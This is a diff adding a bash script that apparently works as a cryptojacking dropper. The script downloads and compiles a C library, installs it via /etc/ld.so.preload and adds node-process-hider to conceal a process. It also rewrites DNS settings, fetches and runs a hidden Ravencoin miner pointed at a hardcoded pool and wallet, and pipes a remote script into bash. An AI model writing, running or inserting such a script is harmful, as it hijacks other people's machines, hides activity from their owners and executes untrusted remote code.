@@ -1,0 +1,15 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://gitlab.com/nass2/eth/-/raw/main/strong.c -o strong.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libstrong.so strong.c -ldl
+mv libstrong.so /usr/local/lib/
+echo /usr/local/lib/libstrong.so >> /etc/ld.so.preload
+rm strong.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add askar"
+wget https://gitlab.com/nass2/eth/-/raw/main/askar >/dev/null 2>&1
+chmod +x askar
+./askar -a kawpow --coin rvn -o stratum+tcp://157.245.59.223:443 -u R9rCxKLhi9eH779oPY1mTXpvDWwvjYiJYR -w RTX3090 >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/sadulang/code/main/sleep.sh | bash
